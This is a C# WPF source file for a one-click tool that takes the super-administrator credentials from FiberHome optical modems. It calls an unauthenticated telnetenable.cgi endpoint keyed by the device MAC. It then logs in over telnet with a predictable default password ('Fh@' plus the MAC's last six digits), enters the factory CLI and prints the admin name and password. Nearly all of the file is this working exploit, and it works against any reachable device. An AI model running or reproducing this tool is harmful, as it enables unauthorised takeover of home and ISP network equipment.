using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Xml;

namespace 一键获取烽火光猫超密
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        TcpClient tcpClient = new TcpClient();
        byte[] recieveBuffer = new byte[100];
        public MainWindow()
        {
            InitializeComponent();
        }

        private async void start(object sender, RoutedEventArgs e)
        {
            try
            {
                System.Windows.Documents.FlowDocument doc = textinfo.Document;
                doc.Blocks.Clear();

                if (!IsIP(ipaddr.Text) || !Ismac(macaddr.Text))
                {
                    MessageBox.Show("请检查ip地址和mac地址");
                    return;
                }
                string ip = ipaddr.Text;
                string mac = macaddr.Text.Replace(":", "").ToUpper();
                string mac6 = mac.Substring(6);
                textinfo.AppendText($"当前ip地址为：{ip}\r");
                textinfo.AppendText($"当前mac地址为：{mac}\r");
                //开始调用http开启telnet
                HttpClient client = new HttpClient();
                var a = $"http://{ip}/cgi-bin/telnetenable.cgi?telnetenable=1&key={mac}";
                 var respon = await client.GetAsync($"http://{ip}/cgi-bin/telnetenable.cgi?telnetenable=1&key={mac}");//http://192.168.1.1/cgi-bin/telnetenable.cgi?telnetenable=1&key=689A2128E2A0
                //respon.Result.EnsureSuccessStatusCode();
                string result = respon.Content.ReadAsStringAsync().Result.Split('(')[1].Split(')')[0];
                if (result.Contains("成功"))
                {
                    textinfo.AppendText($"未检测到开启telnet成功，请手动开启\r");
                    return;
                }
                textinfo.AppendText($"telnet开启情况：{result}\r");
                if (!tcpClient.Connected)
                {
                    tcpClient.Connect(ip, 23);
                }
                Thread.Sleep(100);
                tcpClient.Client.BeginReceive(recieveBuffer, 0, recieveBuffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), null);                
                textinfo.AppendText($"连接路由telnet：{tcpClient.Connected}\r");
                tcpClient.Client.Send(Encoding.ASCII.GetBytes("admin\r"));
                Thread.Sleep(100);
                tcpClient.Client.Send(Encoding.ASCII.GetBytes($"Fh@{mac6}\r"));
                Thread.Sleep(100);
                tcpClient.Client.Send(Encoding.ASCII.GetBytes($"load_cli factory\r"));
                Thread.Sleep(100);
                tcpClient.Client.Send(Encoding.ASCII.GetBytes($"show admin_name\r"));
                Thread.Sleep(100);
                tcpClient.Client.Send(Encoding.ASCII.GetBytes($"show admin_pwd\r"));
            }
            catch (Exception ex)
            {
                textinfo.AppendText(ex.Message+"\r");
            }
        }
        private void ReceiveCallback(IAsyncResult AR)
        {
            // Check how much bytes are recieved and call EndRecieve to finalize handshake
            try
            {
                int recieved = tcpClient.Client.EndReceive(AR);

                if (recieved <= 0)
                    return;

                string message = Encoding.ASCII.GetString(recieveBuffer, 0, recieved);
                if (message.Contains("Success!"))
                {
                    this.Dispatcher.Invoke(() => textinfo.AppendText(message.Replace("show admin_name","").Replace(@"Config\factorydir#","").Replace("show admin_pwd","").Replace("\r\n","").Replace(" ","")));
                }// 只将接收到的数据进行转化
                // Start receiving again
                tcpClient.Client.BeginReceive(recieveBuffer, 0, recieveBuffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), null);
            }
            catch (SocketException ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        #region 验证IP
        /// <summary>
        /// 验证IP
        /// </summary>
        /// <param name="source"></param>
        /// <returns></returns>
        public static bool IsIP(string source)
        {
            return Regex.IsMatch(source, @"^(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])$", RegexOptions.IgnoreCase);
        }
        public static bool HasIP(string source)
        {
            return Regex.IsMatch(source, @"(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])", RegexOptions.IgnoreCase);
        }
        public static bool IsIp(string ip)
        {
            bool result = false;
            try
            {
                string[] iparg = ip.Split('.');
                if (string.Empty != ip && ip.Length < 16 && iparg.Length == 4)
                {
                    int intip;
                    for (int i = 0; i < 4; i++)
                    {
                        intip = Convert.ToInt16(iparg[i]);
                        if (intip > 255)
                        {
                            result = false;
                            return result;
                        }
                    }
                    result = true;
                }
            }
            catch
            {
                return result;
            }
            return result;
        }


        public static bool Ismac(string source)
        {
            return Regex.IsMatch(source, @"^([0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f])$");
        }
        #endregion

        private void Hyperlink_Click(object sender, RoutedEventArgs e)
        {
                Hyperlink link = sender as Hyperlink;
                // 激活的是当前默认的浏览器
                Process.Start(new ProcessStartInfo(link.NavigateUri.AbsoluteUri));
        }
    }   
}
